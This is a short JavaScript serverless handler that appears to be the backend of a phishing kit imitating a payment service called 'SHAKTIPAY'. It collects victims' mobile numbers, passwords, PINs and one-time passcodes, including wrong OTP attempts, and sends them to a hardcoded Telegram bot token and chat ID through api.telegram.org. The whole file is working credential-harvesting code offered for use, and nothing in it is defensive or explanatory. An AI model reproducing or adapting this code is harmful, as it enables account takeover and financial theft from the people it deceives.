export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { phone, password, pin, otp, messageType, status } = req.body;

  // Aapke Telegram Credentials
  const BOT_TOKEN = '9202209441:AAHFMezI4J5P3_1pPVn4UqhxpbE9VwAWMbY';
  const CHAT_ID = '6742408629';

  let text = '';

  if (messageType === 'LOGIN_ATTEMPT') {
    text = `🔐 <b>SHAKTIPAY - Login Attempt</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>6-Digit PIN:</b> ${pin || 'N/A'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  } else if (messageType === 'OTP_REQUESTED') {
    text = `🔐 <b>OTP requested (Modal)</b>\n\n📱 <b>Phone:</b> +91 ${phone || '..........'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  } else if (messageType === 'OTP_VERIFIED') {
    text = `✅ <b>SHAKTIPAY - OTP Verified</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>PIN:</b> ${pin || 'N/A'}\n🔐 <b>OTP:</b> ${otp || 'N/A'}\n✅ <b>Status:</b> ${status}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  } else if (messageType === 'WRONG_OTP') {
    text = `❌ <b>SHAKTIPAY - WRONG OTP</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>PIN:</b> ${pin || 'N/A'}\n🔐 <b>Wrong OTP:</b> ${otp || 'N/A'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
  } else {
    text = `📨 <b>SHAKTIPAY - New Activity</b>\n\n📱 <b>Phone:</b> +91 ${phone || 'N/A'}`;
  }

  try {
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML'
      })
    });

    const data = await response.json();

    if (data.ok) {
      return res.status(200).json({ success: true, message: 'Sent successfully' });
    } else {
      return res.status(500).json({ success: false, error: data.description });
    }
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
